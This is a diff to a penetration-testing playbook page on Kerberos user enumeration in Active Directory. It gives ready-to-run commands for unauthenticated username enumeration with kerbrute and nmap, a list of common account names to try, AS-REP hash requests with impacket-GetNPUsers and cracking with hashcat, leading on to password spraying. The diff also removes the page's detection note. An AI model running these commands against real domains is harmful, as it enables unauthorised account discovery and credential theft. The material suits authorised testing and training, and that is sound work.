@@ -3,41 +3,59 @@ id: kerberos-enum
 title: Kerberos User Enumeration
 stage: enumeration
 tags: [windows, ad, kerberos]
-tools:
-  - kerbrute userenum -d domain.local --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
-  - nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/tmp/users.txt $DC
-  - impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip $DC
-leads_to: [asreproast, kerberoast, password-spray, ldap-enum]
-summary: Enumerate valid domain users via Kerberos pre-authentication error differences — no credentials needed.
+summary: Confirm valid domain usernames using KDC error code differences — no credentials required, and valid users can be immediately tested for AS-REP roastability.
+leads_to:
+  - asreproast
+  - kerberoast
+  - password-spray
+  - ldap-enum
 ---
 
-## Kerbrute — User Enumeration
+## Prerequisites
 
-Kerbrute exploits the KDC returning different error codes (`KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` vs `PREAUTH_REQUIRED`) to confirm valid users without authenticating.
+Port 88 open (domain controller). A domain name (get from SMB banner, DNS, or LDAP). No credentials required.
+
+The Kerberos KDC returns different error codes for non-existent users (`KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN`) vs valid users with pre-auth required (`PREAUTH_REQUIRED`). This difference lets you enumerate valid usernames silently before any authentication attempt. The moment you have a valid user list, immediately test each for AS-REP roastability — accounts with `DONT_REQ_PREAUTH` yield crackable hashes with zero credentials.
+
+## Quick Win
+
+> Kerbrute — fastest user enumeration against the KDC, no auth required.
 
 ```bash
-kerbrute userenum \
-  -d domain.local \
-  --dc $DC \
+kerbrute userenum -d domain.local --dc $DC \
   /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
   -o valid_users.txt
+```
 
-# Smaller wordlist — faster
+## Smaller Wordlist (Faster)
+
+> Start here — covers most common AD account names in seconds.
+
+```bash
 kerbrute userenum -d domain.local --dc $DC \
   /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 ```
 
-## Nmap Kerberos Enum
+## Nmap Fallback
+
+> When kerbrute isn't available or for validation.
 
 ```bash
 nmap -p88 --script krb5-enum-users \
-  --script-args krb5-enum-users.realm='domain.local',userdb=/tmp/users.txt \
-  $DC
+  --script-args krb5-enum-users.realm='domain.local',userdb=/tmp/users.txt $DC
 ```
 
-## ASREPRoast Immediately After
+## Common AD Names to Try First
 
-Once you have a valid user list, immediately test for AS-REP roastable accounts (no pre-auth required):
+```
+administrator  admin  guest  krbtgt
+svc-backup  svc-admin  svc-sql  service
+helpdesk  support  it-admin
+```
+
+## Immediately Test for AS-REP Roast
+
+> Once you have valid users — request hashes for any without pre-auth.
 
 ```bash
 impacket-GetNPUsers domain.local/ -no-pass \
@@ -45,21 +63,9 @@ impacket-GetNPUsers domain.local/ -no-pass \
   -dc-ip $DC \
   -outputfile asrep_hashes.txt
 
-# Crack any hashes found
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-## Common AD Usernames to Try First
+## Leads To
 
-```
-administrator, admin, guest, krbtgt
-svc-backup, svc-admin, svc-sql, service
-helpdesk, support, it-admin
-```
-
-## Notes
-
-- No credentials required — works from a pure network foothold
-- Detected by event ID 4768 with failure code 0x6 (`ERR_C_PRINCIPAL_UNKNOWN`) at the DC
-- Use the found usernames immediately for password spraying and ASREPRoasting
-- `kerbrute` also has `passwordspray` and `bruteuser` modes once you have a user list
+Valid user list → asreproast (immediately), then password-spray with the list. AS-REP hashes cracked → authenticate as that user → ldap-enum and kerberoast. Valid user list alone is enough to begin password spraying — check lockout policy via SMB first.
